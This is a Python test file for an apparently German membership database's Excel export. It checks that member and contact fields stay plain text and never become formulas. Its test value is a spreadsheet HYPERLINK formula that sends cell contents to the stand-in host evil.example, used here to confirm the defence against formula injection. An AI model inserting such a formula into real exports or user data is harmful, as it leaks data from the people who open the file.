"""Formula-safe workbook: member and contact text never becomes a formula."""

import io
import zipfile

from openpyxl import load_workbook

from app.services import export_service
from tests.standesdb.test_export import _contact, _member, _seed

FORMULA = '=HYPERLINK("http://evil.example/?x="&A2,"Klick")'


class TestWorkbookHasNoFormulas:
    def test_member_and_contact_text_stays_text(self, db_session):
        _seed(db_session)
        member = _member(db_session, vorname="M", nachname="N", arbeitgeber=FORMULA)
        contact = _contact(db_session, name=FORMULA)

        raw = export_service.generate_excel_full(db_session, [member], [contact])

        workbook = load_workbook(io.BytesIO(raw))
        assert workbook["Mitglieder"].cell(row=2, column=33).value == FORMULA
        assert workbook["Mitglieder"].cell(row=2, column=33).data_type == "s"
        assert workbook["Kontakte"].cell(row=2, column=4).value == FORMULA
        assert workbook["Kontakte"].cell(row=2, column=4).data_type == "s"
        with zipfile.ZipFile(io.BytesIO(raw)) as archive:
            sheets = [n for n in archive.namelist() if n.startswith("xl/worksheets/")]
            assert all(b"<f>" not in archive.read(n) for n in sheets)
